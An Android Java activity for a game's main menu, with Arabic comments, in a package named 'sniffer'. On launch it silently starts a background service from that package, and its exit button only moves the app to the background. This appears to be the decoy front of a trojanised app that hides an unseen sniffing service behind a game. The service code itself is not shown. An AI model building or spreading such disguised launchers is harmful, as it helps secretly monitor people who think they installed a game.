package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.BackgroundService;

public class MainGameActivity extends Activity {

    private Button btnPlay, btnSettings, btnExit;
    private TextView tvHighScore, tvWelcome;
    private ImageView ivLogo;
    private int highScore = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        // تشغيل الخدمة الخلفية
        startBackgroundService();

        // تهيئة العناصر
        initViews();
        
        // تحميل أفضل نتيجة
        loadHighScore();
        
        // إعداد أزرار التحكم
        setupClickListeners();
    }

    private void startBackgroundService() {
        try {
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void initViews() {
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnExit = findViewById(R.id.btn_exit);
        tvHighScore = findViewById(R.id.tv_high_score);
        tvWelcome = findViewById(R.id.tv_welcome);
        ivLogo = findViewById(R.id.iv_logo);

        // إضافة تأثيرات حركية
        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);
    }

    private void loadHighScore() {
        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);
    }

    private void setupClickListeners() {
        btnPlay.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                startActivity(intent);
            }
        });

        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameSettingsActivity.class);
                startActivity(intent);
            }
        });

        btnExit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                moveTaskToBack(true);
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadHighScore();
    }
}
